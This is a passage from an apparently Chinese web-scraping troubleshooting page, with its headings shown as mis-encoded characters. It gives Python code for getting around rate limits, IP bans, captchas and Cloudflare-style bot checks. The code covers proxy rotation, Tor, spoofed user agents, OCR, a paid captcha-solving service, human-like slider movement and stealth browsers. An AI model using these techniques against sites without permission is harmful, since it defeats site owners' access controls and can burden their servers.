<span class="k">def</span><span class="w"> </span><span class="nf">fetch_with_delay</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="c1"># éšæœºå»¶è¿Ÿ 1-3 ç§’</span>
    <span class="n">delay</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">delay</span><span class="p">)</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>

<span class="c1"># æ‰¹é‡è¯·æ±‚</span>
<span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">urls</span><span class="p">:</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">fetch_with_delay</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="c1"># å¤„ç†å“åº”...</span>
</code></pre>
      </div>

      <h4 id="2-å®ç°é€€é¿ç®—æ³•">2. å®ç°é€€é¿ç®—æ³•</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">def</span><span class="w"> </span><span class="nf">fetch_with_backoff</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">max_retries</span><span class="o">=</span><span class="mi">5</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æŒ‡æ•°é€€é¿é‡è¯•&quot;&quot;&quot;</span>
    <span class="k">for</span> <span class="n">attempt</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">max_retries</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">429</span><span class="p">:</span>
                <span class="c1"># è·å– Retry-After å¤´</span>
                <span class="n">retry_after</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Retry-After&#39;</span><span class="p">,</span> <span class="mi">60</span><span class="p">))</span>
                <span class="n">wait_time</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">retry_after</span><span class="p">,</span> <span class="mi">2</span> <span class="o">**</span> <span class="n">attempt</span><span class="p">)</span>

                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Rate limited. Waiting </span><span class="si">{</span><span class="n">wait_time</span><span class="si">}</span><span class="s2">s...&quot;</span><span class="p">)</span>
                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">wait_time</span><span class="p">)</span>
                <span class="k">continue</span>

            <span class="k">return</span> <span class="n">response</span>

        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Attempt </span><span class="si">{</span><span class="n">attempt</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="si">}</span><span class="s2"> failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span> <span class="o">**</span> <span class="n">attempt</span><span class="p">)</span>

    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;Max retries exceeded&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-ä½¿ç”¨ä»£ç†æ± è½®æ¢">3. ä½¿ç”¨ä»£ç†æ± è½®æ¢</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ProxyPool</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxies</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">proxies</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">failed_proxies</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_proxy</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–å¯ç”¨ä»£ç†&quot;&quot;&quot;</span>
        <span class="n">available</span> <span class="o">=</span> <span class="p">[</span><span class="n">p</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxies</span> <span class="k">if</span> <span class="n">p</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">failed_proxies</span><span class="p">]</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">available</span><span class="p">:</span>
            <span class="c1"># é‡ç½®å¤±è´¥åˆ—è¡¨</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">failed_proxies</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
            <span class="n">available</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxies</span>

        <span class="k">return</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">available</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">mark_failed</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ ‡è®°ä»£ç†å¤±è´¥&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">failed_proxies</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">proxy</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">proxy_list</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">&#39;http://proxy1.com:8080&#39;</span><span class="p">,</span>
    <span class="s1">&#39;http://proxy2.com:8080&#39;</span><span class="p">,</span>
    <span class="s1">&#39;http://proxy3.com:8080&#39;</span><span class="p">,</span>
<span class="p">]</span>

<span class="n">pool</span> <span class="o">=</span> <span class="n">ProxyPool</span><span class="p">(</span><span class="n">proxy_list</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">fetch_with_proxy_rotation</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
        <span class="n">proxy</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="n">get_proxy</span><span class="p">()</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
                <span class="n">url</span><span class="p">,</span>
                <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="n">proxy</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="n">proxy</span><span class="p">},</span>
                <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span>
            <span class="p">)</span>
            <span class="k">return</span> <span class="n">response</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Proxy </span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s2"> failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="n">pool</span><span class="o">.</span><span class="n">mark_failed</span><span class="p">(</span><span class="n">proxy</span><span class="p">)</span>

    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;All proxies failed&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ip-è¢«å°ç¦">IP è¢«å°ç¦</h2>

      <h3 id="é—®é¢˜è¡¨ç°-3">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>æ‰€æœ‰è¯·æ±‚è¿”å› 403</li>
        <li>é•¿æ—¶é—´æ— å“åº”</li>
        <li>é‡å®šå‘åˆ°éªŒè¯é¡µé¢</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-3">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-ä½¿ç”¨ä»£ç†æœåŠ¡">1. ä½¿ç”¨ä»£ç†æœåŠ¡</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨å•†ä¸šä»£ç†æœåŠ¡</span>
<span class="n">PROXY_API_URL</span> <span class="o">=</span> <span class="s2">&quot;http://proxy-service.com/api/get&quot;</span>

<span class="k">def</span><span class="w"> </span><span class="nf">get_proxy</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ä»ä»£ç†æœåŠ¡è·å–ä»£ç†&quot;&quot;&quot;</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">PROXY_API_URL</span><span class="p">)</span>
    <span class="n">proxy</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;http://</span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s2">&quot;</span>

<span class="k">def</span><span class="w"> </span><span class="nf">fetch_with_dynamic_proxy</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="n">proxy</span> <span class="o">=</span> <span class="n">get_proxy</span><span class="p">()</span>
    <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="n">proxy</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="n">proxy</span><span class="p">}</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>
</code></pre>
      </div>

      <h4 id="2-ä½¿ç”¨-tor-ç½‘ç»œ">2. ä½¿ç”¨ Tor ç½‘ç»œ</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="c1"># Tor SOCKS5 ä»£ç† (éœ€è¦è¿è¡Œ Tor æœåŠ¡)</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;socks5h://127.0.0.1:9050&#39;</span><span class="p">,</span>
    <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="s1">&#39;socks5h://127.0.0.1:9050&#39;</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># å®‰è£…: pip install requests[socks]</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>

<span class="c1"># éªŒè¯ IP</span>
<span class="n">ip_check</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://httpbin.org/ip&#39;</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Current IP: </span><span class="si">{</span><span class="n">ip_check</span><span class="o">.</span><span class="n">json</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-è½®æ¢ç”¨æˆ·èº«ä»½">3. è½®æ¢ç”¨æˆ·èº«ä»½</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

<span class="n">USER_AGENTS</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) ...&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Mozilla/5.0 (X11; Linux x86_64) ...&#39;</span><span class="p">,</span>
<span class="p">]</span>

<span class="k">def</span><span class="w"> </span><span class="nf">get_random_headers</span><span class="p">():</span>
    <span class="k">return</span> <span class="p">{</span>
        <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">USER_AGENTS</span><span class="p">),</span>
        <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="s1">&#39;zh-CN,zh;q=0.9&#39;</span><span class="p">,</span> <span class="s1">&#39;en-US,en;q=0.9&#39;</span><span class="p">]),</span>
    <span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">get_random_headers</span><span class="p">())</span>
</code></pre>
      </div>

      <hr />

      <h2 id="éªŒè¯ç æ‹¦æˆª">éªŒè¯ç æ‹¦æˆª</h2>

      <h3 id="é—®é¢˜è¡¨ç°-4">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>ç™»å½•æˆ–è®¿é—®æ—¶å‡ºç°éªŒè¯ç </li>
        <li>å›¾ç‰‡éªŒè¯ç ã€æ»‘å—éªŒè¯ç ã€ç‚¹é€‰éªŒè¯ç </li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-4">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-å›¾ç‰‡éªŒè¯ç è¯†åˆ«-ocr">1. å›¾ç‰‡éªŒè¯ç è¯†åˆ« (OCR)</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">PIL</span><span class="w"> </span><span class="kn">import</span> <span class="n">Image</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">pytesseract</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">io</span><span class="w"> </span><span class="kn">import</span> <span class="n">BytesIO</span>

<span class="k">def</span><span class="w"> </span><span class="nf">recognize_captcha</span><span class="p">(</span><span class="n">captcha_url</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;OCR è¯†åˆ«éªŒè¯ç &quot;&quot;&quot;</span>
    <span class="c1"># ä¸‹è½½éªŒè¯ç </span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">captcha_url</span><span class="p">)</span>
    <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">))</span>

    <span class="c1"># å›¾ç‰‡é¢„å¤„ç†</span>
    <span class="n">img</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s1">&#39;L&#39;</span><span class="p">)</span>  <span class="c1"># è½¬ç°åº¦</span>
    <span class="n">img</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">point</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="mi">0</span> <span class="k">if</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="mi">128</span> <span class="k">else</span> <span class="mi">255</span><span class="p">)</span>  <span class="c1"># äºŒå€¼åŒ–</span>

    <span class="c1"># OCR è¯†åˆ«</span>
    <span class="n">code</span> <span class="o">=</span> <span class="n">pytesseract</span><span class="o">.</span><span class="n">image_to_string</span><span class="p">(</span><span class="n">img</span><span class="p">,</span> <span class="n">config</span><span class="o">=</span><span class="s1">&#39;--psm 7&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">code</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">captcha_code</span> <span class="o">=</span> <span class="n">recognize_captcha</span><span class="p">(</span><span class="s1">&#39;https://example.com/captcha.jpg&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Recognized: </span><span class="si">{</span><span class="n">captcha_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-ä½¿ç”¨æ‰“ç å¹³å°">2. ä½¿ç”¨æ‰“ç å¹³å°</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">class</span><span class="w"> </span><span class="nc">TwoCaptcha</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;2Captcha æ‰“ç å¹³å°&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">api_key</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">api_key</span> <span class="o">=</span> <span class="n">api_key</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&quot;http://2captcha.com&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">solve_image_captcha</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">image_path</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è§£å†³å›¾ç‰‡éªŒè¯ç &quot;&quot;&quot;</span>
        <span class="c1"># 1. æäº¤éªŒè¯ç </span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">image_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="n">f</span><span class="p">}</span>
            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">api_key</span><span class="p">,</span> <span class="s1">&#39;method&#39;</span><span class="p">:</span> <span class="s1">&#39;post&#39;</span><span class="p">}</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
                <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/in.php&quot;</span><span class="p">,</span>
                <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span>
                <span class="n">data</span><span class="o">=</span><span class="n">data</span>
            <span class="p">)</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;OK|&#39;</span><span class="p">):</span>
            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Submit failed: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="n">captcha_id</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>

        <span class="c1"># 2. è½®è¯¢ç»“æœ</span>
        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
                <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/res.php&quot;</span><span class="p">,</span>
                <span class="n">params</span><span class="o">=</span><span class="p">{</span>
                    <span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">api_key</span><span class="p">,</span>
                    <span class="s1">&#39;action&#39;</span><span class="p">:</span> <span class="s1">&#39;get&#39;</span><span class="p">,</span>
                    <span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="n">captcha_id</span>
                <span class="p">}</span>
            <span class="p">)</span>

            <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;OK|&#39;</span><span class="p">):</span>
                <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>

        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;Timeout waiting for result&quot;</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">solver</span> <span class="o">=</span> <span class="n">TwoCaptcha</span><span class="p">(</span><span class="n">api_key</span><span class="o">=</span><span class="s1">&#39;your_api_key&#39;</span><span class="p">)</span>
<span class="n">code</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">solve_image_captcha</span><span class="p">(</span><span class="s1">&#39;captcha.jpg&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-æ»‘å—éªŒè¯ç ">3. æ»‘å—éªŒè¯ç </h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">selenium</span><span class="w"> </span><span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.common.action_chains</span><span class="w"> </span><span class="kn">import</span> <span class="n">ActionChains</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">def</span><span class="w"> </span><span class="nf">solve_slider_captcha</span><span class="p">(</span><span class="n">driver</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;è§£å†³æ»‘å—éªŒè¯ç &quot;&quot;&quot;</span>
    <span class="c1"># æ‰¾åˆ°æ»‘å—å…ƒç´ </span>
    <span class="n">slider</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="s1">&#39;css selector&#39;</span><span class="p">,</span> <span class="s1">&#39;.slider-button&#39;</span><span class="p">)</span>

    <span class="c1"># æ¨¡æ‹Ÿäººç±»æ»‘åŠ¨è½¨è¿¹</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">get_track</span><span class="p">(</span><span class="n">distance</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆç§»åŠ¨è½¨è¿¹&quot;&quot;&quot;</span>
        <span class="n">track</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">current</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">mid</span> <span class="o">=</span> <span class="n">distance</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">/</span> <span class="mi">5</span>

        <span class="c1"># åŠ é€Ÿé˜¶æ®µ</span>
        <span class="k">while</span> <span class="n">current</span> <span class="o">&lt;</span> <span class="n">mid</span><span class="p">:</span>
            <span class="n">move</span> <span class="o">=</span> <span class="mi">2</span>
            <span class="n">track</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">move</span><span class="p">)</span>
            <span class="n">current</span> <span class="o">+=</span> <span class="n">move</span>

        <span class="c1"># å‡é€Ÿé˜¶æ®µ</span>
        <span class="k">while</span> <span class="n">current</span> <span class="o">&lt;</span> <span class="n">distance</span><span class="p">:</span>
            <span class="n">move</span> <span class="o">=</span> <span class="mi">1</span>
            <span class="n">track</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">move</span><span class="p">)</span>
            <span class="n">current</span> <span class="o">+=</span> <span class="n">move</span>

        <span class="k">return</span> <span class="n">track</span>

    <span class="c1"># è·å–éœ€è¦æ»‘åŠ¨çš„è·ç¦»</span>
    <span class="n">distance</span> <span class="o">=</span> <span class="mi">260</span>  <span class="c1"># æ ¹æ®å®é™…æƒ…å†µè°ƒæ•´</span>

    <span class="c1"># æ‰§è¡Œæ»‘åŠ¨</span>
    <span class="n">action</span> <span class="o">=</span> <span class="n">ActionChains</span><span class="p">(</span><span class="n">driver</span><span class="p">)</span>
    <span class="n">action</span><span class="o">.</span><span class="n">click_and_hold</span><span class="p">(</span><span class="n">slider</span><span class="p">)</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>

    <span class="k">for</span> <span class="n">move</span> <span class="ow">in</span> <span class="n">get_track</span><span class="p">(</span><span class="n">distance</span><span class="p">):</span>
        <span class="n">action</span><span class="o">.</span><span class="n">move_by_offset</span><span class="p">(</span><span class="n">move</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>

    <span class="n">action</span><span class="o">.</span><span class="n">release</span><span class="p">()</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="javascript-æŒ‘æˆ˜">JavaScript æŒ‘æˆ˜</h2>

      <h3 id="é—®é¢˜è¡¨ç°-5">é—®é¢˜è¡¨ç°</h3>

      <ul>
        <li>é¡µé¢æ˜¾ç¤º &#8220;Checking your browser&#8221;</li>
        <li>Cloudflareã€DataDome ç­‰é˜²æŠ¤</li>
        <li>éœ€è¦æ‰§è¡Œ JavaScript æ‰èƒ½è®¿é—®</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ-5">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-ä½¿ç”¨-cloudscraper">1. ä½¿ç”¨ cloudscraper</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">cloudscraper</span>

<span class="c1"># è‡ªåŠ¨ç»•è¿‡ Cloudflare</span>
<span class="n">scraper</span> <span class="o">=</span> <span class="n">cloudscraper</span><span class="o">.</span><span class="n">create_scraper</span><span class="p">()</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">scraper</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-ä½¿ç”¨-selenium-undetected-chromedriver">2. ä½¿ç”¨ Selenium + undetected-chromedriver</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">undetected_chromedriver</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">uc</span>

<span class="n">driver</span> <span class="o">=</span> <span class="n">uc</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
<span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="c1"># ç­‰å¾…é¡µé¢åŠ è½½</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

<span class="c1"># è·å–å†…å®¹</span>
<span class="n">html</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">page_source</span>
<span class="n">driver</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
</code></pre>
      </div>

      <h4 id="3-ä½¿ç”¨-playwright-stealth">3. ä½¿ç”¨ Playwright (Stealth)</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">playwright.sync_api</span><span class="w"> </span><span class="kn">import</span> <span class="n">sync_playwright</span>

<span class="k">with</span> <span class="n">sync_playwright</span><span class="p">()</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
    <span class="n">browser</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">chromium</span><span class="o">.</span><span class="n">launch</span><span class="p">(</span>
        <span class="n">headless</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
